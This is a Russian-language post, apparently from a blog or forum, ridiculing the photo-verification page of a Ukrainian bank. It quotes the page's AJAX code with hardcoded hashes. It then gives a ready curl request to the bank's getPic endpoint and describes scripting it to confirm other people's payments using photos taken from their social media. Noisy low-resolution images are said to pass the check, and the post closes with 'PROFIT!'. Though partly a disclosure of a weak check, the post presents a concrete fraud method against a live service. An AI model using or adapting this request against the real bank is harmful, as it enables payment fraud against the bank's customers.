# https://pb.ua/photo/ и Детский Сад

Привет-банк в очередной раз порадовал профессионализмом своих разработчиков.

https://pb.ua/photo/ созданная якобы для "безопасности" клиентов == одна огромная дыра.

При каждом новом открытии сайта "для дополнительной безопасности транзакций" меняется только одна строка с якобы случайным числом/хешем/строкой захардкоженым прямо в post запрос:

```
	$.ajax({
		type : "POST",
		url : "getPic",
		contentType: 'application/json',
		dataType: 'text',
		data : '{ "url":"'+dataUrl+'", "phone":"'+$("#phone").val()+'","isFromCamera":"'+$("#ph_type").val()+'","hash":"20ca1639033e72c5d534d0f5c9f69dd291dda12261bb45b319ea267d21c6164e","hash2":"afdb2b7e88629c710e935c58ff33e827b60012d1c1f7f1c4bfced497e4375735"}',				
		success: function(data, textStatus, jqXHR ){
			show_prog('none');
		},
```

Судя по коду, это единственная попытка сделать хоть что-то для защиты от "хакеров" из десткого сада.

Реальной безопасности - 0. 

Буквально за полчаса можно написать скрипт, который будет спрашивать новый хеш прямо с сайта https://pb.ua/photo/ и вставлять его внутрь заранее подготовленного POST curl:

```
curl 'https://pb.ua/photo/getPic' -H 'X-NewRelic-ID: VgAEV1RTGwABU1NSAAQ=' -H 'Origin: https://pb.ua' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.8,ru;q=0.6,uk;q=0.4' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36' -H 'Content-Type: application/json' -H 'Accept: text/plain, */*; q=0.01' -H 'Referer: https://pb.ua/photo/' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' --data-binary '{ "url":"data:image/png;base64,iVBORw0K...==", "phone":"+380991234567","isFromCamera":"Y","hash":"123","hash2":"456"}' --compressed
```

что дает возможность "подтверждать" платежи любого человека в автоматическом режиме, используя фотографию из контакта/фейсбука к примеру

PS Естесвенно без карты в руках фотографии тоже проходят "проверку", тем более если слать фотки с кучей шума и 640х480 растянутые с 320х240

# PROFIT!
